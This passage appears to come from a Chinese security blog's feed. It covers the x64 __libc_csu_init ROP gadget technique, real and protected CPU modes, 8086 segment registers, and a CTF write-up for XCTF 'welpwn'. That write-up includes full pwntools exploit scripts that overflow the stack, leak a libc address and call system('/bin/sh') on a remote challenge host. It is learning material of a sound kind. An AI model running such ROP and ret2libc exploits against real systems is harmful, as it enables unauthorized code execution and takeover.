从上图可以看出在x64下fun函数的前6个参数是通过寄存器rdi、rsi、rdx、rcx、r8和r9进行传递，后面的3个函数则是通过入栈的方式 2.gadget 由于x64下函数的前6个参数是通过寄存器rdi、rsi、rdx、rcx、r8和r9进行传递的，所以我们需要一些类似于pop rdi; ret指令来改变这些寄存器的值，来满足我们的需求，而这些指令被称为gadget。 参数个数：1-2个 当函数的参数比较少时，我们可以在程序中搜索一些简单的gadget指令，其中查找gadget的著名工具有： ROPEME: https://github.com/packz/ropeme Ropper: https://github.com/sashs/Ropper ROPgadget: https://github.com/JonathanSa… rp++: https://github.com/0vercl0k/rp 如下图：（使用工具为ROPgadget） 参数个数：3个 在上图中我们没有发现可以改变第3个参数的gadget指令（pop rdx;ret），那么我们就无法再控制指令了。因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。[1]下文会对通用函数__libc_csu_init中的gadget进行详细解释。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。 0X01 __libc_csu_init源码 123456789101112131415161718192021222324252627282930313233343500000000004011d0 &lt;__libc_csu_init&gt;: 4011d0: 41 57 push %r15 4011d2: 4c 8d 3d 37 2c 00 00 lea 0x2c37(%rip),%r15 # 403e10 &lt;__frame_dummy_init_array_entry&gt; 4011d9: 41 56 push %r14 4011db: 49 89 d6 mov %rdx,%r14 4011de: 41 55 push %r13 4011e0: 49 89 f5 mov %rsi,%r13 4011e3: 41 54 push %r12 4011e5: 41 89 fc mov %edi,%r12d 4011e8: 55 push %rbp 4011e9: 48 8d 2d 28 2c 00 00 lea 0x2c28(%rip),%rbp # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt; 4011f0: 53 push %rbx 4011f1: 4c 29 fd sub %r15,%rbp 4011f4: 48 83 ec 08 sub $0x8,%rsp 4011f8: e8 03 fe ff ff callq 401000 &lt;_init&gt; 4011fd: 48 c1 fd 03 sar $0x3,%rbp 401201: 74 1b je 40121e &lt;__libc_csu_init+0x4e&gt; 401203: 31 db xor %ebx,%ebx 401205: 0f 1f 00 nopl (%rax) 401208: 4c 89 f2 mov %r14,%rdx 40120b: 4c 89 ee mov %r13,%rsi 40120e: 44 89 e7 mov %r12d,%edi 401211: 41 ff 14 df callq *(%r15,%rbx,8) 401215: 48 83 c3 01 add $0x1,%rbx 401219: 48 39 dd cmp %rbx,%rbp 40121c: 75 ea jne 401208 &lt;__libc_csu_init+0x38&gt; 40121e: 48 83 c4 08 add $0x8,%rsp 401222: 5b pop %rbx 401223: 5d pop %rbp 401224: 41 5c pop %r12 401226: 41 5d pop %r13 401228: 41 5e pop %r14 40122a: 41 5f pop %r15 40122c: c3 retq 40122d: 0f 1f 00 nopl (%rax) 我们将上述程序简化一下，并分为两个部分： 12345678910111213141516171819202122232425# part 1 401208: 4c 89 f2 mov %r14,%rdx 40120b: 4c 89 ee mov %r13,%rsi 40120e: 44 89 e7 mov %r12d,%edi 401211: 41 ff 14 df callq *(%r15,%rbx,8) 401215: 48 83 c3 01 add $0x1,%rbx 401219: 48 39 dd cmp %rbx,%rbp 40121c: 75 ea jne 401208 &lt;__libc_csu_init+0x38&gt; 40121e: 48 83 c4 08 add $0x8,%rsp 401222: 5b pop %rbx 401223: 5d pop %rbp 401224: 41 5c pop %r12 401226: 41 5d pop %r13 401228: 41 5e pop %r14 40122a: 41 5f pop %r15 40122c: c3 retq # part 2 401222: 5b pop %rbx 401223: 5d pop %rbp 401224: 41 5c pop %r12 401226: 41 5d pop %r13 401228: 41 5e pop %r14 40122a: 41 5f pop %r15 40122c: c3 retq 从位于地址401208到40120e的指令，可以看出： r14 ----&gt; rdx ： arg3 r13 ----&gt; rsi ： arg2 r12 ----&gt; rdi ： arg1 我们可以看到利用401222处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用401208处的代码我们将r15的值赋值给rdx,r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。 0X02 通用gadget在栈中的情况 我们先来推导一下上述代码运行时，栈中的变化，这里要注意的是我们须先执行part2部分的指令，然后再执行part1的指令，假设我们栈中是下图情况（存在栈溢出漏洞） 现在我们构造payload，根据栈中的情况： return address处应该是part2的入口地址 执行part2中的指令，这时esp指向return address 6 个 pop 语句，依次将栈顶的数据赋值给寄存器rbx、rbp、r12、r13、r14、r15 1 个 ret 语句，此时esp执行的时r15对应栈顶的位置+8 则我们构造payload如下： 1234567891011payload = padding + "a"*8 # 填充部分和old ebp部分payload += p64(part2)payload += p64(0) # rbx = 0，因为401211处的callq *(%r15,%rbx,8)，我们要将r15的值为调用函数的地址payload += p64(1) # rbp = 1，因为401219处的cmp %rbx,%rbp，这里必须要使得rbx和rbp相等，因为我们将rbx设置为0，而在401215处将rbx进行加1，所以这里rbp的值也要为1payload += p64(arg1) # r12 = arg1payload += p64(arg2) # r13 = arg2 payload += p64(arg3) # r14 = arg3payload += p64(function_got_addr) # r15 = function_got_addrpayload += p64(part1) # return --&gt; part1payload += "a"*56 # 6个pop指令 + add $0x8,%rsp语句 payload += p64(return_address) # 返回到指定地址 上述payload在栈中的执行情况如下： 点击下载上述过程文件 要说明的是，这里的payload并不是固定的，要根据程序的实际情况来定 0x05 其他通用函数 除了上面介绍的 __libc_csu_init()，还可以到下面的函数中找一找：[2] 12345678910_init_startcall_gmon_startderegister_tm_clonesregister_tm_clones__do_global_dtors_auxframe_dummy__libc_csu_init__libc_csu_fini_fini 0x04 Reference [1] 一步一步学ROP之linux_x64篇 [2] 通用 gadget [3] ROP学习：利用通用gadget]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转载】CPU 的两种工作模式：实模式和保护模式]]></title>
    <url>%2F2020%2F06%2F14%2F2020.06.14%EF%BC%88127%EF%BC%89%2F</url>
    <content type="text"><![CDATA[首先我们要知道这两种模式都是 CPU 的工作模式，实模式是早期 CPU 运行的工作模式，而保护模式则是现代 CPU 运行的工作模式。 0x00 实模式（Real Mode） 1.起源 实模式出现于早期 8086 CPU 时期，8086 也是第一款支持内存分段模型的处理器。当时，8086 只有一种工作模式，即实模式，但当时还没有这个说法。由于 CPU 的性能有限，一共只有 20 位地址线（地址空间只有 1M），以及 8 个 16 位的通用寄存器，以及 4 个 16 位的段寄存器。16 位的物理地址只能访问 64KB 的内存。所以，为了能够通过这些 16 位的寄存器去构成 20 位的主存地址，访问 1 MB 的内存，必须采取一种特殊的方式。 2.原理 第一个字段是由段寄存器提供的，是一个 16 位的段基址。第二字段是段内偏移量，它的值是由通用寄存器（如 EIP）来提供，所以也是 16 位。那么问题来了，两个 16 位的值如何组合成一个 20 位的地址呢？这里采用的方式是：把段寄存器所提供的段基址先向左移 4 位（或乘以 16），这样就变成了一个 20 位的值，然后再与 16 位的段偏移量相加。如下所示： 物理地址=段基址*16+段内偏移物理地址=段基址*16+段内偏移 所以，假设段基址的值是0xFF00，段内偏移的值是0x0110。则物理地址可表示为: 0xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF1100xFF00*16+0x0110 = 0xFF000+0x0110 = 0xFF110 3.应用 在现代计算机上，实模式存在的时间非常短，所以一般我们是感觉不到它的存在。CPU 复位（reset）或加电（power on）的时候就是以实模式启动，在这个时候处理器以实模式工作，不能实现权限分级，也不能访问 20 位以上的地址线，也就只能访问 1M 内存。之后，加载操作系统模块，进入保护模式。 此外，在这种模式下，系统在计算实际地址的时候是按照对 1M 求模的方式进行的，这种技术被称为 wrap-around。也就是说，当程序员给出超过 1M（100000H ~ 10FFEFH）的地址时，为了保持逻辑上正常，系统并不认为其访问越界而产生异常，而是自动从 0 开始计算。 然而，在实模式中整个物理内存被看成分段的区域，程序代码和数据位于不同区域，系统程序和用户程序没有区别对待，而且每一个指针都是指向「实在」的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序区域，并改变了值，容易造成软件甚至系统崩溃。 0x01 保护模式（Protected Mode） 1.起源 最开始的程序寻址是直接的段基址 : 段内偏移模式，这样的好处是所见即所得，程序员指定的地址就是物理地址，物理地址对程序员是可见的。但这就带来一些问题： 无法支持多任务 程序的安全性无法得到保证 随着 CPU 的发展，CPU 的地址线的个数也从原来的 20 根变为现在的 32 根，所以可以访问的内存空间也从 1 MB 变为现在 4 GB，寄存器的位数也变为 32 位。因此，实模式下的内存地址计算方式就已经不再适用了，需要引入新的模式，即保护模式，实现更大空间的、更灵活的内存访问。 在保护模式下，全部 32 条地址线有效，可寻址高达 4 GB 的物理地址空间。扩充的存储器段式管理机制和可选的页式管理机制，不仅为存储器共享和保护提供了硬件支持，而且为实现虚拟存储器提供了硬件支持，支持多任务，能够快速地进行任务切换和保护任务环境。四个特权级和完善的特权检查机制，既能实现资源共享又能保证代码和数据的安全及任务的隔离。 总的来说，保护模式出现的原因名副其实：保护进程地址空间。 2.原理 在保护模式下，地址的表示方式与实模式是一样的，都是段基址 : 段内偏移。不过，保护模式下段的概念发生了根本性的改变。实模式下的段值可以看作是地址的一部分，可直接参与转换计算。而保护模式下的段值（尽管仍然由原来的段寄存器表示）变成了一个索引（准确来说是 16 位的段选择子/段标识符 Selector，前 13 位为索引信息，后 3 位是硬件信息），指向了一个数据结构的一个表项（段表项），表项中详细定义了段基址、界限、属性（权限）等内容。这个数据结构是全局描述符（GDT，Global Descriptor Table），也有可能是本地描述符（LDT，Local Descriptor Table）。它们存放关于某个运行在内存中的程序的分段信息的，比如某个程序的代码段是从哪里开始，有多大；数据段又是从哪里开始，有多大。 GDT 的作用是用来提供段式存储机制，这种机制是段寄存器和 GDT 中的描述符（段表项）共同支持的。每个描述符在 GDT 中占 8 字节，也就是 2 个双字（一个字等于两个字节，双字等于四个字节），或者说是 64 位。描述符的构成如下图所示： GDT 描述符示意图（来源见参考） 其中： G 位是粒度位（Granularity），用于解释段界限的含义； D/B 位是默认的操作数大小（Default Operation Size），主要是为了能够在 32 位处理器上兼容运行 16 位保护模式的程序； L 位，是64 位代码段标志，保留此位给 64 位处理器使用； AVL 位，是可以使用的位（Available），通常由操作系统来用，处理器并不使用它； P 位是段存在位（Segment Present），表示对应的段是否存在； DPL 表示描述符的特权级（Descriptor Privilege Level），0 ~ 3，0 表示最高特权级别，这里再次点明了为何叫保护模式； S 位是描述符的类型位（Descriptor Type），0 为系统段，1 为代码段或数据段； TYPE 字段共 4 位，用于指示描述符的类型（X 执行、W 读写、R 读出、A 已访问）。 很明显，描述符中指定了 32 位的段基址，以及 20 位的段界限。在实模式下，段基址并非是真实的物理地址，在计算物理地址时，还要左移 4 位（乘以 16）。和实模式不同，在 32 位保护模式下，段基址是 32 位的，若加上段内偏移即为线性地址。如果未开启分页功能，该线性地址就是物理地址。 GDT 和 LDT 示意图（来源见参考） GDT 和 LDT 的区别在于： 全局可见（global）和局部可见（local）； LDT 表存放在 LDT 类型的段之中，此时 GDT 必须含有 LDT 的段描述符； LDT 本身是一个段，而 GDT 不是。 访问流程： 查找 GDT 在线性地址中的段基址（表本身的位置），需要借助 GDTR 寄存器； 通过该段基址和逻辑地址中的段标识符（selector），可以找到 LDT 段描述符； 通过 GDT 中的这个 LDT 段描述符可以找到 LDT 相应的基地址； 访问 LDT 需要使用 LDT 基地址和 LDT 段选择符（或叫段标识符），为了减少访问 LDT 时的段转换次数，LDT 段基址、LDT 段选择符、LDT 段限长都存放在 LDTR 寄存器中。 注意：这里和 关于操作系统内存管理的总结 中关于段式内存管理的描述有点出入。这里多了 LDT，因此从 GDT 中获得的是 LDT 段描述符，而不再是段基址。 对于操作系统来说，每个系统必须定义一个 GDT，用于系统中的所有任务和程序。系统可选择性定义若干个 LDT。GDT 本身不是一个段，而是线性地址空间的一个数据结构；而 LDT 本身是一个段。 想知道更多可以参考第三篇文章，整理得很好。 0x02 Reference MIT 6.828 JOS 学习笔记 6. Appendix 1: 实模式（real mode）与保护模式（protected mode） 操作系统篇-浅谈实模式与保护模式 操作系统篇-分段机制与 GDT | LDT 汇编学习（十七）X86汇编学习 (4) GDT]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实模式下的段寄存器]]></title>
    <url>%2F2020%2F06%2F14%2F2020.06.14%EF%BC%88126%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 前言 首先想要说明的是这里介绍的原理都是CPU实模式下的情况，有关CPU工作模式的请点击这里，下面简单的介绍一下段寄存器的来源和故事： 实模式出现于早期8088CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采取一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：段基址：段偏移量。[1] 但是随着CPU的发展，CPU的地址线的个数也从原来的20根变为现在的32根，所以可以访问的内存空间也从1MB变为现在4GB，寄存器的位数也变为32位。所以实模式下的内存地址计算方式就已经不再适合了。所以就引入了现在的保护模式，实现更大空间的，更灵活的内存访问。 0x01 CS:IP 在解释段代码段寄存器CS之前，我们先了解一下16位下8086PC的CPU结构，如下图 ： 从图中可以看出，8086CPU是一个16位结构，它在处理、传输、暂存存储的地址为16位，但是它的地址总线为20位，所以要想办法用“地址加法器”使得两个16位的地址合成一个20位的物理地址。图中已经给出解决方法：用一个16位的段地址和一个16位的偏移地址，使得段地址*16+偏移地址就得到了20位的物理地址，相当于物理地址=基地址（段地址*16）+偏移地址，那这里为什么乘上16呢，这是因为这里地址的表示方式是16进制，乘上16相当于左移4位，也就从16位变为20位。 在这里留一个问题：怎么将一个20bit的字符串存储在16bit长的内存中呢？ 在程序运行时，CPU怎么知道下一步要执行的语句呢？这里就需要CS:IP上场了，其中CS是代码段寄存器，存储的是当前指令的段地址，IP是指令指针寄存器，存储的是偏移地址，在8086PC中，CPU将CS:IP指向的内容当作指令执行，比如在8086PC（16位）中，CS的值为a，IP的值为b，那么 CPU下一条执行的指令就是处于地址a*16+b单元的数据，举例如下图： 图中的CS值为2000H，IP的值0000H，那么物理地址就为2000H*16+0000H = 20000H，所以要执行的指令为mov ax,0123H，下面我们用DOS的Debug进行调试 首先我们将内存2000:0000-2000:0009处的内存改为如上图中的数据，然后我们再将CS和IP的值进行修改 我们可以从上图中最后一行可以看出，CPU将要执行2000:0000处的指令，这样我们就很清楚代码寄存器CS和指令指针寄存器IP的作用了：被用来指向CPU要执行的指令，也可以说将数据解释为代码 0x02 DS和[address] CPU在读写内存单元的时候，那么它是怎么找到该内存单元地址的？下面就来到了数据段寄存器DS，在8086PC中，内存地址由段地址和偏移地址组成，那么DS就是用来存放要访问数据的段地址的寄存器，比如要读取20001H单元的内容，汇编代码如下： 123mov ax,2000Hmov ds,ax # 不能直接mov ds,2000H，因为8086CPU不支持将数据直接送入段寄存器的操作mov al,[1] 上面的汇编代码就是将地址20001H处的数据读取到寄存器ax的低8位中，其中[1]表示的是内存单元的偏移地址，ds中的数据为内存单元的段地址，那么物理地址就为：ds*16+1，这里要说明一点：在mov al,[1]指令中，[]中的1是偏移地址，而CPU会默认去寄存器DS中寻找它的段地址。下面我们还是用0x00中的例子来说明这一点： 地址2000:0000地址的字节为23b8H（小端存储），我们将这个值赋给寄存器ax，则汇编指令为： 123mov ax,2000Hmov ds,axmov ax,[0] 我们在Debug中向地址1000:0000处输入我们的指令，然后再修改CS和IP的值分别为1000和0000，如下图： 从上图中最后一行，我们可以看到下一条指令的指令为mov ax,2000H，那么下面我们执行完上面四条指令看一下结果： 这里简单总结一下：对于存储在内存中的数据，CPU会根据CS:IP或者DS和[address]来解释为代码或者数值 0x03 SS:SP CPU如何知道栈顶的位置？有关栈的问题不在这里叙述了，可以参考这两篇文章：手把手教你栈溢出从入门到放弃（上）和手把手教你栈溢出从入门到放弃（下）。我们知道CPU靠的是CS:IP知道了要指令指令所在的位置，靠DS和[address]知道了数据存储的位置，那么CPU也应该有相应的寄存器来存放栈顶的地址，那就是SS:SP，其中段寄存器SS存放的是栈顶的段地址，SP存放的是偏移地址，任意时刻，SS:SP指向栈顶元素，push指令和pop指令执行时，CPU会从SS和SP中得到栈顶的位置，但是这里要注意的这两个指令： push SP = SP - 2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶 将ax中的值放到SS:SP指向的内存单元，SS:SP此时指向新栈顶 比如初始状态为SS=3000H，SP = 0002H，现在执行push ax，那么栈顶偏移SP = SP - 2，开辟了一个新的16位空间，然后再把ax的值放进去，此时SP=0000H，具体操作如下图 初始值为： ax=1234H,bx=0000H（普通寄存器） cs=1000H,IP=000EH（执行指针） ss=3000H,sp=0002H（栈顶） 现在向地址1000:000E，处写入下方指令push ax，得到如下结果： 从上图中得出信息： ax=1234H,bx=0000H（普通寄存器） cs=1000H,IP=000FH（执行指针）发生改变 ss=3000H,sp=0000H（栈顶）发生改变 和我们推到的一样 pop 将SS:SP指向的内存单元处的数据送入ax中 SP = SP + 2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶 比如初始状态为SS=3000H，SP=0000H，现在执行pop bx，那么会将此时栈顶的数据（1234H）放入寄存器bx中，然后SP = SP - 2，具体操作如下： 初始值为： ax=1234H,bx=0000H（普通寄存器） cs=1000H,IP=000FH（执行指针） ss=3000H,sp=0000H（栈顶） 现在向1000:000F中写入pop bx，如下： 从上图中得出信息： ax=1234H,bx=1234H（普通寄存器）发生改变 cs=1000H,IP=0010H（执行指针）发生改变 ss=3000H,sp=0002H（栈顶）发生改变 栈顶又恢复到3000:0002，而且bx的值也发生了改变 0x04 Reference [1] “段寄存器”的故事 [2] 王爽，《汇编语言》]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-pwn】welpwn是个什么东西？（RCTF-2015）]]></title>
    <url>%2F2020%2F06%2F12%2F2020.06.12%EF%BC%88125%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识点1.\x00截断符&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面给大家一个简单的C程序： 12345678// Function：截断符测试# include&lt;stdio.h&gt;int main()&#123; char a[20]; scanf("%s",a); printf("%s",a);&#125; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们现在正常运行一下该程序，输入为“Hello\x00World”，运行结果输出为Hello\x00World，有的人可能要有疑问了，这里的输入有\x00，为什么还会输出World？要注意我们这里输入的\x00被当作4个单独的字符\、x、0和0，没有被内存解释为截断符号，所以这里不会发生字符串截断，那么下面我们通过pwntools工具来演示一下符号截断，脚本如下： 12345678910#! python3#! /usr/bin/env python3#! coding: utf-8from pwn import *sh = process("./test")context(log_level="debug")payload = "1" + str(p64(0),encoding="unicode_escape") + "2"sh.sendline(payload)print(sh.recv()) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图是该程序运行的具体过程： 红色圈中的是p64(0)的数值，会产生\x00截断符 白色圈中是最后的运行结果，可以发现2没有被打印出来，这是由于前面有截断符号 注意：这里应该注意的是对p64()、p32()函数很大概率会产生截断符号 0x01 题目分析12# file pwn pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped 该程序是一个64位的ELF可执行程序 1234567# checksec pwn [*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/welpwn/pwn&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 只开启了栈不可执行保护，下面对IDA中的伪代码进行分析： 1234567891011// main函数int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [sp+0h] [bp-400h]@1 write(1, "Welcome to RCTF\n", 0x10uLL); fflush(_bss_start); read(0, &amp;buf, 0x400uLL); echo((__int64)&amp;buf); return 0;&#125; main函数功能是输入一个大小为0x400的buf空间，可以看出该输入点不存在栈溢出漏洞；然后里面调用了echo()函数，下面我们进如echo()函数看一下： 1234567891011121314int __fastcall echo(__int64 a1)&#123; char s2[16]; // [sp+10h] [bp-10h]@2 for ( i = 0; *(_BYTE *)(i + a1); ++i ) s2[i] = *(_BYTE *)(i + a1); s2[i] = 0; if ( !strcmp("ROIS", s2) ) &#123; printf("RCTF&#123;Welcome&#125;", s2); puts(" is not flag"); &#125; return printf("%s", s2);&#125; 上面的伪代码中for循环的终止条件*(_BYTE *)(i + a1)不是很明白，那么我们就用gdb简单的调试一下，从汇编代码中我们可以看到终止条件所对应的汇编代码为： 120x400776 &lt;echo+89&gt;: test al,al0x400778 &lt;echo+91&gt;: jne 0x400735 &lt;echo+24&gt; 可以通过调试看出，这是在比较寄存器rax中的低16位，如果低16位的ASCII值不为0的，也就是低16位的符号不为\x00的话，则跳转至0x400735，否则结束for循环。那么for的终止条件就很明确了，只要遇见\x00符号就退出循环。然后最后一位赋值给0。 到这里细心的你就会发现s2的空间为ebp-0x10，而a1的大小却足足有0x400，将a1赋值给s2就说明这里存在着栈溢出的漏洞，那么我们可以对buf输入的值的长度超过0x10，那么s2必定会产生栈溢出，下面我们就找一下栈中的情况。 首先是buf的地址：$rbp-0x400得到0x7fffffffe360，这里的rbp为0x7fffffffe760 再来确定s2的地址：$rbp-0x10得到0x7fffffffe340，这里的rbp为0x7fffffffe350 如下图所示： s2和buf之间的地址差为0x7fffffffe360-0x7fffffffe340=0x20，而栈给echo函数分配的空间就为0x20，那么我们就可以画出一个简单的栈示意图，如下图： 假设我们输入的buf大小正好是0x20，我们来看看栈中的情况，如下图绿色部分就是s2复制的buf的0x20的字节： 那么我们是不是就可以利用这个使得返回地址变为我们想要返回的地方？那么下面我们就尝试一下将返回地址返回到puts函数，然后利用puts函数打印出write函数的GOT中的地址，根据64位的传参情况，我们构造如下payload： 12345678910111213#! python3#! /usr/bin/env python3#! conding: utf-8from pwn import *context(log_level="debug")elf = ELF("./pwn")sh = process("./pwn")pop_rdi = 0x4008a3write_got = elf.got["write"]puts_addr = elf.symbols["puts"]payload = "a"*0x18 + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(write_got),encoding="unicode_escape") + str(p64(puts_addr),encoding="unicode_escape")sh.sendlineafter("Welcome to RCTF\n", payload)print(sh.recv()) 运行被阻断，从下面的过程中可以看出，是由于p64(pop_rdi)产生了截断符号造成的，导致s2只能复制buf的前0x20个字符，示意图如下： 那么我们也就无法将0x7fffffffe360处的write_got的地址作为参数传递给寄存器rdi了，但是我们可以看到在buf存储空间上p64(pop_rdi)和后面的参数紧密的连接着，那么我们是不是可以执行buf空间的rop呢？答案当然是可以的，现在看来是需要我们将ret指令指向地址为0x7fffffffe378，那么我们可以使用pop|retgadget来达到该目的，如果需要gadget的话，那么栈中发生变化，如下： 从上面的图中可以看出，需要我们跳转的地址并不再是0x7fffffffe378而是0x7fffffffe380，所以需要pop出栈4次才能使得栈顶eip指向0x7fffffffe380，那么我们找一下该程序中有没有这样的gadget，通过ROPgadget --binary pwn --only &quot;pop|ret&quot;指令可以找到这样的gadget，如下图中的红色圈中的内容，我们选择地址为0x000000000040089c的gadget 那么我们重新构造的payload为： 1234567891011121314#! python3#! /usr/bin/env python3#! conding: utf-8from pwn import *context(log_level="debug")elf = ELF("./pwn")sh = process("./pwn")pop_ret4 = 0x40089cpop_rdi = 0x4008a3write_got = elf.got["write"]puts_addr = elf.symbols["puts"]payload = "a"*0x18 + str(p64(pop_ret4),encoding="unicode_escape") + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(write_got),encoding="unicode_escape") + str(p64(puts_addr),encoding="unicode_escape")sh.sendlineafter("Welcome to RCTF\n", payload)print(sh.recv()) 那么我们怎么知道哪一个是我们想得到的write_addr的值呢？因为是先执行完echo函数中的指令，才能返回到调用函数前的返回地址，由于我们只讲buf的前0x20个字节赋值给了s2，所以返回的前0x20个字符不是我们想要的，后面的才是我们想要的write_addr值，我们可以看到接受的最后一个字符是\x40，这是pop_ret4在栈中的小端存储方式造成的，所以我们修改一下我们payload，将最后的接受的数据改为： 123sh.recvuntil("\x40")write_addr = u64(str(sh.recv(6),encoding="unicode_escape").ljust(8,"\x00"))print("[*] write_addr:",hex(write_addr)) 运行结果如下图，从下图中可以看出，9c 08 40后面就是我们想要得到的write_addr的值（这是由puts函数打印出来的）。 我们既然已经得到了write的真实地址，那么我们就可以泄露出system和/bin/sh的装载时的地址，这里我们需要用到一个python库LibcSearcher库，这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。[1]根据该库作者的提示，我们可以这样泄露出write函数所在Libc库中的版本，同时泄露出system和/bin/sh的偏移 12345678910from LibcSearcher# libc是所在库的版本号libc = LibcSearcher("write",write_got) # write_got 就是我们上面得到的write函数的真实地址# 加载时的libc基地址libc_base = write_got - libc.dump("write")# 计算system函数加载时的虚拟地址system_addr = libc_base + libc.dump("system")# 计算/bin/sh函数加载时的虚拟地址bin_sh_addr = libc_base + libc.dump("str_bin_sh") 在前面leakwrite函数地址的时候，已经将程序结束运行了，那怎么再次发送我们的payload呢？在这里需要用到一个技巧，就是在打印出write函数地址后，使得返回地址为main函数的地址，使程序重新运行，那么我们在泄露write函数的payload就得加上一个main函数地址，如下： 12main = elf.symbols["main"]payload = "a"*0x18 + str(p64(pop4_ret),encoding="unicode_escape") + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(write_got),encoding="unicode_escape") + str(p64(puts_addr),encoding="unicode_escape") + str(p64(main),encoding="unicode_escape") 这样我们还可以再对buf输入一次值，那么第二次输入的payload和第一次的payload没有太大的区别，只不过是换了一下地址的值，示意图如下： 1payload = "a"*0x18 + str(p64(pop4_ret),encoding="unicode_escape") + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(bin_sh_addr),encoding="unicode_escape") + str(p64(system_addr),encoding="unicode_escape") 0x02 解题步骤 具体的解题思路可以看题目分析部分，这里根据上文直接给出exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#! python3#! /usr/bin/env python3#! coding: utf-8from pwn import *from LibcSearcher import *pop4_ret = 0x40089cpop_rdi = 0x4008a3# 泄露write函数装载时的地址def leak_write(r,elf): write_got = elf.got["write"] print("[*] write_got:",hex(write_got)) puts_addr = elf.symbols["puts"] print("[*] puts_addr:",hex(puts_addr)) puts_plt = elf.plt["puts"] print("[*] puts_plt:",hex(puts_plt)) main = elf.symbols["main"] print("[*] main_addr:",hex(main)) payload = "a"*0x18 + str(p64(pop4_ret),encoding="unicode_escape") + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(write_got),encoding="unicode_escape") + str(p64(puts_addr),encoding="unicode_escape") + str(p64(main),encoding="unicode_escape") r.sendlineafter("Welcome to RCTF\n", payload) #r.recvuntil('a'*(0x10+8)) r.recvuntil("\x40") write_addr = u64(str(r.recvn(6),encoding="unicode_escape").ljust(8,"\x00")) print("[+] write_addr:",write_addr) return write_addr# 寻找system和/bin/sh的虚拟地址def find_system_bin_addr(write_addr,r,elf): libc = LibcSearcher("write",write_addr) print("[+] libc:",libc) libc_base = write_addr - libc.dump("write") system_addr = libc_base + libc.dump("system") bin_sh_addr = libc_base + libc.dump("str_bin_sh") payload = "a"*0x18 + str(p64(pop4_ret),encoding="unicode_escape") + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(bin_sh_addr),encoding="unicode_escape") + str(p64(system_addr),encoding="unicode_escape") r.sendline(payload) r.interactive()# 主函数if __name__ == "__main__": r = remote("220.249.52.133",30472) elf = ELF("./pwn") context(log_level="debug") write_addr = leak_write(r,elf) find_system_bin_addr(write_addr,r,elf) 0x03 Reference[1] Search libc function offset [2] 攻防世界PWN之Welpwn题解]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（六）[random]]]></title>
    <url>%2F2020%2F06%2F09%2F2020.06.09%EF%BC%88124%EF%BC%89%2F</url>
